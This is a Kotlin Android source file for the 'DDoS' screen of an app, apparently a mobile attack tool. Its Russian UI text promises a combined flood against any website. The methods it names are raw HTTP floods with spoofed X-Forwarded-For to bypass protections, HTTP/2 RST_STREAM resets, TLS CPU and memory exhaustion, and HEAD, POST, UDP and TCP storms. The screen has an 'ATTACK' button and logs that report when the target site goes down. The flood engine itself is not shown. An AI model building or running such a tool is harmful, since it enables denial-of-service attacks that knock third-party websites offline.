package com.toolkit.app

import android.os.Handler
import android.os.Looper
import androidx.activity.compose.BackHandler
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.StrokeCap
import androidx.compose.ui.graphics.StrokeJoin
import androidx.compose.ui.graphics.drawscope.Fill
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.toolkit.app.ui.Accent
import com.toolkit.app.ui.AccentSoft
import com.toolkit.app.ui.BorderGlass
import com.toolkit.app.ui.GlassCard
import com.toolkit.app.ui.OkGreen
import com.toolkit.app.ui.TextDim
import com.toolkit.app.ui.TextMain
import com.toolkit.app.ui.WarnOrange
import com.toolkit.app.ui.flatButtonElevation
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

@Composable
fun DdosIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
    val alpha = if (animated) {
        val t = rememberInfiniteTransition(label = "ddos")
        val a = t.animateFloat(
            initialValue = 0.35f,
            targetValue = 1f,
            animationSpec = infiniteRepeatable(tween(650), RepeatMode.Reverse),
            label = "pulse",
        )
        a.value
    } else 1f
    Canvas(modifier = modifier) {
        val w = size.width
        val h = size.height
        val path = Path().apply {
            moveTo(w * 0.58f, h * 0.02f)
            lineTo(w * 0.18f, h * 0.60f)
            lineTo(w * 0.46f, h * 0.60f)
            lineTo(w * 0.42f, h * 0.98f)
            lineTo(w * 0.84f, h * 0.42f)
            lineTo(w * 0.55f, h * 0.42f)
            close()
        }
        drawPath(
            path,
            color.copy(alpha = alpha),
            style = Stroke(width = w * 0.09f, cap = StrokeCap.Round, join = StrokeJoin.Round),
        )
        drawPath(path, color.copy(alpha = alpha * 0.16f), style = Fill)
    }
}

@Composable
fun DdosScreen(onBack: () -> Unit) {
    var url by remember { mutableStateOf("https://example.com") }
    var running by remember { mutableStateOf(false) }
    var snap by remember { mutableStateOf(StresserSnapshot()) }
    var target by remember { mutableStateOf("") }
    val logs = remember { mutableStateListOf<LogLine>() }
    val listState = rememberLazyListState()
    val engine = remember { mutableStateOf<StresserEngine?>(null) }
    var hist by remember { mutableStateOf<List<Float>?>(null) }
    val wasDropped = remember { mutableStateOf(false) }
    val pingSpiked = remember { mutableStateOf(false) }
    val anim = animatedSnap(snap)

    BackHandler(enabled = true, onBack = onBack)

    fun addLog(text: String, color: Color = TextDim) {
        val ts = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        logs.add(LogLine("[$ts] $text", color))
        if (logs.size > 80) logs.removeAt(0)
    }

    LaunchedEffect(logs.size) {
        if (logs.isNotEmpty()) runCatching { listState.scrollToItem(logs.size - 1) }
    }

    fun stopDdos() {
        running = false
        engine.value?.stop()
        engine.value = null
    }

    fun startDdos() {
        val raw = url.trim()
        if (raw.isEmpty()) {
            addLog("Введите адрес сайта", WarnOrange)
            return
        }
        var u = raw
        if (!u.contains("://")) u = "https://$u"
        val host: String
        val port: Int
        try {
            val uri = URI(u)
            val h = uri.host ?: throw IllegalArgumentException("нет хоста")
            host = h
            port = if (uri.port > 0) uri.port else if (uri.scheme.equals("http", true)) 80 else 443
        } catch (t: Throwable) {
            addLog("Некорректный адрес: $raw", WarnOrange)
            return
        }
        logs.clear()
        wasDropped.value = false
        pingSpiked.value = false
        val ui = Handler(Looper.getMainLooper())
        val e = StresserEngine(
            host = host,
            port = port,
            withBroadcast = false,
            onMetrics = { m ->
                ui.post {
                    snap = m
                    hist = engine.value?.pingHistory
                    if (!m.dropped) wasDropped.value = false
                    if (m.pingMs > 2000 && !pingSpiked.value) {
                        pingSpiked.value = true
                        addLog("Ответы замедлились: ${m.pingMs.toInt()} мс — сайт захлёбывается", WarnOrange)
                    } else if (m.pingMs < 800 && pingSpiked.value) {
                        pingSpiked.value = false
                    }
                }
            },
            onLog = { text, color -> ui.post { addLog(text, color) } },
            onDrop = {
                ui.post {
                    wasDropped.value = true
                    addLog("Цель не отвечает! Сайт лёг или забанил ваш IP", Color(0xFFFF6B6B))
                }
            },
        )
        target = host
        engine.value = e
        running = true
        addLog("Цель: $host:$port (${if (port == 443) "HTTPS" else "HTTP"})", AccentSoft)
        addLog("Запуск: RAW HTTP + HTTP/2 RST_STREAM + TLS CPU/RAM + HEAD-шторм…", AccentSoft)
        e.start()
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp, vertical = 18.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
                modifier = Modifier
                    .size(40.dp)
                    .clip(CircleShape)
                    .clickable(onClick = onBack),
                contentAlignment = Alignment.Center,
            ) {
                Icon(
                    Icons.AutoMirrored.Filled.ArrowBack,
                    contentDescription = "Назад",
                    tint = TextMain,
                    modifier = Modifier.size(22.dp),
                )
            }
            Spacer(Modifier.width(6.dp))
            Text(
                "DDoS",
                color = TextMain,
                fontSize = 22.sp,
                fontWeight = FontWeight.Bold,
            )
            Spacer(Modifier.weight(1f))
            DdosIcon(
                modifier = Modifier.size(30.dp),
                color = if (running) AccentSoft else Accent,
                animated = running,
            )
        }

        Spacer(Modifier.height(14.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(16.dp)) {
                Text(
                    "Жёсткий комбинированный флуд с одного устройства, без root. " +
                        "Работает по любому сайту — https и http.",
                    color = TextMain,
                    fontSize = 13.sp,
                    lineHeight = 18.sp,
                )
                Spacer(Modifier.height(10.dp))
                Text(
                    "• RAW HTTP-шторм — огромное число сырых запросов с подменой X-Forwarded-For (обход защит).\n" +
                        "• HTTP/2 RST_STREAM — тысячи команд принудительного сброса потоков.\n" +
                        "• TLS CPU — тяжёлая криптография RSA/ECDHE при каждом рукопожатии жжёт процессор сервера.\n" +
                        "• TLS RAM — десятки спящих шифрованных соединений заставляют сервер держать контекст сессий.\n" +
                        "• HEAD-шторм + POST + TCP-churn + UDP + RST — миллион методов в одном.",
                    color = TextDim,
                    fontSize = 12.sp,
                    lineHeight = 17.sp,
                )
            }
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Row(
                modifier = Modifier.padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                OutlinedTextField(
                    value = url,
                    onValueChange = { url = it },
                    modifier = Modifier.weight(1f),
                    singleLine = true,
                    label = { Text("Сайт (https://)", color = TextDim, fontSize = 13.sp) },
                    placeholder = { Text("https://site.com", color = TextDim.copy(alpha = 0.5f), fontSize = 13.sp) },
                    textStyle = MaterialTheme.typography.bodyLarge.copy(
                        color = TextMain,
                        fontSize = 15.sp,
                        fontFamily = FontFamily.Monospace,
                    ),
                    keyboardOptions = KeyboardOptions(
                        keyboardType = KeyboardType.Uri,
                        imeAction = ImeAction.Done,
                    ),
                    keyboardActions = KeyboardActions(onDone = { if (!running) startDdos() }),
                    shape = RoundedCornerShape(14.dp),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Accent,
                        unfocusedBorderColor = BorderGlass,
                        focusedTextColor = TextMain,
                        cursorColor = Accent,
                        focusedLabelColor = AccentSoft,
                    ),
                )
                Spacer(Modifier.width(12.dp))
                Button(
                    onClick = { if (running) stopDdos() else startDdos() },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (running) Color(0xFFB3261E) else Accent,
                        contentColor = if (running) Color.White else Color(0xFF0E1013),
                    ),
                    shape = RoundedCornerShape(14.dp),
                    elevation = flatButtonElevation(),
                    modifier = Modifier.height(54.dp),
                ) {
                    Text(
                        if (running) "СТОП" else "АТАКА",
                        fontSize = 14.sp,
                        fontWeight = FontWeight.Bold,
                        letterSpacing = 1.sp,
                    )
                }
            }
        }

        if (target.isNotEmpty()) {
            Spacer(Modifier.height(10.dp))
            Text(
                "Цель: $target  ·  ${
                    if (snap.okRate > 80) "сервер держится" else if (snap.okRate > 40) "замедляется" else "падает"
                }",
                color = TextDim,
                fontSize = 12.sp,
            )
        }

        Spacer(Modifier.height(12.dp))
        Row(Modifier.fillMaxWidth()) {
            StatTile(Modifier.weight(1f), "Отдача", speedStr(anim.upKBs))
            Spacer(Modifier.width(8.dp))
            StatTile(Modifier.weight(1f), "Ответ", if (anim.pingMs > 0) "${anim.pingMs.toInt()} мс" else "—")
            Spacer(Modifier.width(8.dp))
            StatTile(Modifier.weight(1f), "Соединения", "${anim.liveConns}")
            Spacer(Modifier.width(8.dp))
            StatTile(Modifier.weight(1f), "Успех", "${snap.okRate.toInt()}%")
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(14.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        "Сайт в реальном времени",
                        color = TextMain,
                        fontSize = 14.sp,
                        fontWeight = FontWeight.SemiBold,
                    )
                    Spacer(Modifier.weight(1f))
                    if (snap.dropped) {
                        Text("САЙТ НЕ ОТВЕЧАЕТ", color = Color(0xFFFF6B6B), fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    } else {
                        Text(
                            "Успех ${snap.okRate.toInt()}%",
                            color = if (snap.okRate > 80) OkGreen else WarnOrange,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                        )
                    }
                }
                Spacer(Modifier.height(8.dp))
                LatencyGraph(hist)
                Spacer(Modifier.height(4.dp))
                Row {
                    Box(Modifier.size(8.dp).clip(CircleShape).background(Accent))
                    Spacer(Modifier.width(6.dp))
                    Text("время ответа", color = TextDim, fontSize = 11.sp)
                    Spacer(Modifier.width(14.dp))
                    Box(Modifier.size(8.dp).clip(CircleShape).background(Color(0xFFFF6B6B)))
                    Spacer(Modifier.width(6.dp))
                    Text("нет ответа — сайт лежит", color = TextDim, fontSize = 11.sp)
                }
            }
        }

        Spacer(Modifier.height(12.dp))
        GlassCard(modifier = Modifier.fillMaxWidth()) {
            Column(Modifier.padding(14.dp)) {
                Text("Логи", color = TextMain, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                Spacer(Modifier.height(6.dp))
                if (logs.isEmpty()) {
                    Text(
                        "Вставьте адрес сайта и жмите АТАКА — здесь появится лог.",
                        color = TextDim,
                        fontSize = 12.sp,
                    )
                } else {
                    LazyColumn(
                        state = listState,
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(180.dp),
                    ) {
                        items(logs.size) { i ->
                            val l = logs[i]
                            Text(
                                l.text,
                                color = l.color,
                                fontFamily = FontFamily.Monospace,
                                fontSize = 12.sp,
                                lineHeight = 16.sp,
                            )
                        }
                    }
                }
            }
        }
    }
}
